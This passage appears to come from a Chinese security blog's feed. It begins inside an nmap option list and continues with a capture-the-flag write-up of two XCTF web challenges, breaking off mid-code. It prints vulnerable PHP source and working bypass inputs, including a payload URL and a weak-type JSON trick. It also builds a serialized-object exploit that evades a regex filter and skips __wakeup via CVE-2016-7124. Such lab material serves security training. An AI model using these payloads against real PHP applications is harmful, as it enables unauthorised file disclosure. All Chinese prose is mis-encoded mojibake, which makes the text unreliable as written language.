ÊòæÁ§∫Ë∑ØÁî±‰ø°ÊÅØÂíåÊé•Âè£,‰æø‰∫éË∞ÉËØï<br> ‚Äìlog-errors            ÊääÊó•ÂøóÁ≠âÁ∫ß‰∏∫errors&#x2F;waringsÁöÑÊó•ÂøóËæìÂá∫<br> ‚Äìappend-output         ËøΩÂä†Âà∞ÊåáÂÆöÁöÑÊñá‰ª∂<br> ‚Äìresume FILENAME       ÊÅ¢Â§çÂ∑≤ÂÅúÊ≠¢ÁöÑÊâ´Êèè<br> ‚Äìstylesheet PATH&#x2F;URL   ËÆæÁΩÆXSLÊ†∑ÂºèË°®ÔºåËΩ¨Êç¢XMLËæìÂá∫<br> ‚Äìwebxml                ‰ªénamp.orgÂæóÂà∞XMLÁöÑÊ†∑Âºè<br> ‚Äìno-sytlesheet         ÂøΩÁï•XMLÂ£∞ÊòéÁöÑXSLÊ†∑ÂºèË°®</p></blockquote><p>ÂÖ∂‰ªñnmapÈÄâÈ°π</p><blockquote><p>-6                      ÂºÄÂêØIPv6<br> -A                      OSËØÜÂà´,ÁâàÊú¨Êé¢Êµã,ËÑöÊú¨Êâ´ÊèèÂíåtraceroute<br> ‚Äìdatedir DIRNAME       ËØ¥ÊòéÁî®Êà∑NmapÊï∞ÊçÆÊñá‰ª∂‰ΩçÁΩÆ<br> ‚Äìsend-eth &#x2F; ‚Äìsend-ip  ‰ΩøÁî®Âéü‰ª•Â§™ÁΩëÂ∏ßÂèëÈÄÅ&#x2F;Âú®ÂéüIPÂ±ÇÂèëÈÄÅ<br> ‚Äìprivileged            ÂÅáÂÆöÁî®Êà∑ÂÖ∑ÊúâÂÖ®ÈÉ®ÊùÉÈôê<br> ‚Äìunprovoleged          ÂÅáÂÆöÁî®Êà∑‰∏çÂÖ∑ÊúâÂÖ®ÈÉ®ÊùÉÈôê,ÂàõÂª∫ÂéüÂßãÂ•óÊé•Â≠óÈúÄË¶ÅrootÊùÉÈôê<br> -V                      ÊâìÂç∞ÁâàÊú¨‰ø°ÊÅØ<br> -h                      ËæìÂá∫Â∏ÆÂä©</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Èù∂Âú∫ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ÊîªÈò≤‰∏ñÁïå-web</title>
      <link href="/2023/03/18/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web/"/>
      <url>/2023/03/18/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p><img src="https://img-blog.csdnimg.cn/777b9016dc7d4931934149f054da6fb2.png" alt="1"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$key1</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$key2</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">6000000</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token string single-quoted-string">'8b184b'</span> <span class="token operator">===</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$key1</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Emmm...ÂÜçÊÉ≥ÊÉ≥"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Emmm..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword type-casting">array</span><span class="token punctuation">)</span><span class="token function">json_decode</span><span class="token punctuation">(</span>@<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span>@<span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"m"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"m"</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">2022</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span>@<span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"DGGJ"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$d</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token operator">?</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no..."</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token class-name return-type">NULL</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=></span><span class="token variable">$val</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$val</span><span class="token operator">===</span><span class="token string double-quoted-string">"DGGJ"</span><span class="token operator">?</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no......"</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token class-name return-type">NULL</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$key2</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no hack"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$key2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">include</span> <span class="token string double-quoted-string">"Hgfks.php"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You're right"</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÈááÁî®ÁßëÂ≠¶ËÆ°Êï∞Ê≥ïÁªïËøáa&#x3D;9e9</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">6000000</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ÁºñÂÜôËÑöÊú¨</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span><span class="token number">1000000</span> <span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'8b184b'</span> <span class="token operator">===</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$i</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÂæóÂà∞<br><img src="https://img-blog.csdnimg.cn/be82814851a4407c84b59756e4a81c42.png" alt="2"><br>Âç≥b&#x3D;53724</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$c</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword type-casting">array</span><span class="token punctuation">)</span><span class="token function">json_decode</span><span class="token punctuation">(</span>@<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#Êé•Êî∂jsonÊ†ºÂºèÁöÑÂ≠óÁ¨¶‰∏≤Âπ∂Â∞ÜÂÖ∂ËΩ¨Âåñ‰∏∫Êï∞ÁªÑ</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>‰∫ÜËß£‰∏Ä‰∏ãjsonÊ†ºÂºè<a href="https://zhuanlan.zhihu.com/p/74151127">JSONÊï∞ÊçÆÊ†ºÂºèËØ¶Ëß£</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span>@<span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"m"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"m"</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">2022</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Áî®c&#x3D;{‚Äúm‚Äù:‚Äù2222c‚Äù}ÁªïËøáÔºå</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span>@<span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>c&#x3D;{‚Äúm‚Äù:‚Äù2222c‚Äù,‚Äùn‚Äù:[[1],0]}</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$d</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"DGGJ"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ÈªòËÆ§ÁöÑÁ¨¨‰∏â‰∏™flaseÂèÇÊï∞ÂØºËá¥‰∫ÜÂº±Á±ªÂûãÊØîËæÉÊºèÊ¥û„ÄÇÂΩìÊàë‰ª¨ÁöÑ$c[‚Äún‚Äù]&#x3D;0ÁöÑÊó∂ÂÄô(ÊàñËÄÖnull)Ôºå‰ºöÂ∞ÜÂâçÈù¢Ë¶ÅÊü•ÊâæÁöÑÂ≠óÁ¨¶‰∏≤Ëá™Âä®ËΩ¨Âåñ‰∏∫0ÁÑ∂ÂêéËøõË°åÊØîËæÉ„ÄÇ<br>ÁªïËøáÊâãÊ≥ï<strong>c&#x3D;{‚Äúm‚Äù:‚Äù2222c‚Äù,‚Äùn‚Äù:[[],0]}</strong><br>payloadÔºö<code>http://61.147.171.105:54356?a=9e9&amp;b=53724&amp;c=&#123;&quot;m&quot;:&quot;2222c&quot;,&quot;n&quot;:[[0],0]&#125;</code></p><p><img src="https://img-blog.csdnimg.cn/4707ba60885b4bab8b4c6a5e663060b4.png" alt="3"></p><h2 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h2><p><img src="https://img-blog.csdnimg.cn/e550b56fa030492b9f805746e000103b.png" alt="1"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Demo</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">private</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">echo</span> @<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token comment">//the secret is in the fl4g.php</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token variable">$var</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[oc]:\d+:/i'</span><span class="token punctuation">,</span> <span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'stop hacking!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>     <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Áî±‰ª£Á†ÅÂèØÁü•ÔºåflagÊñá‰ª∂ÂæàÊúâÂèØËÉΩÂú®fl4g.phpÈáå„ÄÇ<br>ÂàÜÊûê‰∏Ä‰∏ã‰ª£Á†ÅÔºö</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token comment">//the secret is in the fl4g.php</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ËøôÊÆµ‰ª£Á†Å‰ºöÂ∞ÜÊàë‰ª¨Ë¶ÅÊâæÁöÑÊñá‰ª∂ÊõøÊç¢‰∏∫index.php„ÄÇ<br>Êú¨È¢òÁöÑphpÁâàÊú¨‰∏∫<strong>PHP&#x2F;5.3.10-1</strong>ÔºåÂèØ‰ª•‰ΩøÁî®<strong>cveÊºèÊ¥û</strong>ÁªïËøá_wakeup()„ÄÇ</p><blockquote><p>CVE-2016-7124(ÁªïËøá__wakeup)<br>ÊºèÊ¥ûÂΩ±ÂìçÁâàÊú¨Ôºö<br>PHP5 &lt; 5.6.25<br>PHP7 &lt; 7.0.10</p></blockquote><blockquote><p>ÊºèÊ¥û‰∫ßÁîüÂéüÂõ†Ôºö<br>Â¶ÇÊûúÂ≠òÂú®__wakeupÊñπÊ≥ïÔºåË∞ÉÁî® unserilize() ÊñπÊ≥ïÂâçÂàôÂÖàË∞ÉÁî®__wakeupÊñπÊ≥ïÔºå‰ΩÜÊòØÂ∫èÂàóÂåñÂ≠óÁ¨¶‰∏≤‰∏≠Ë°®Á§∫ÂØπË±°Â±ûÊÄß‰∏™Êï∞ÁöÑÂÄºÂ§ß‰∫é ÁúüÂÆûÁöÑÂ±ûÊÄß‰∏™Êï∞Êó∂‰ºöË∑≥Ëøá__wakeupÁöÑÊâßË°å </p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token variable">$var</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[oc]:\d+:/i'</span><span class="token punctuation">,</span> <span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'stop hacking!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÁªïËøáÊ≠£ÂàôË°®ËææÂºèÔºåÈ¶ñÂÖàËß£Èáä‰∏Ä‰∏ã<code>&#39;/[oc]:\d+:/i&#39;</code>Ôºå<code>[oc]</code>ÔºöÂåπÈÖçÂà∞oÊàñcÔºå<code>\d</code>ÔºöÊï¥ÂûãÊï∞„ÄÇ‰πüÂ∞±ÊòØÂåπÈÖçÂà∞Á±ª‰ºº**O:2:<strong>ÁöÑ‰ºöËæìÂá∫</strong>stop hacking!<strong>Â¶Ç‰ΩïÁªïËøáÂë¢ÔºüÊàë‰ª¨Êää</strong>O:2:<strong>ÊîπÊàê</strong>O:+2:**‰∏çÂ∞±Ë°å‰∫ÜÔºü<br>ÂÖ∑‰Ωì‰ª£Á†ÅÔºö</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Demo</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">private</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">echo</span> @<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token comment">//the secret is in the fl4g.php</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">x</span><span class="token punctuation">&#123;</span><span class="token keyword">private</span> <span class="token variable">$file</span><span class="token operator">=</span><span class="token string single-quoted-string">'fl4g.php'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Demo</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fl4g.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'O:4:'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'O:+4:'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ÁªïËøáÊ≠£ÂàôË°®ËææÂºè</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">':1:'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">':2:'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ÁªïËøá_wakeup()ÂáΩÊï∞</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">.</span><span class="token string 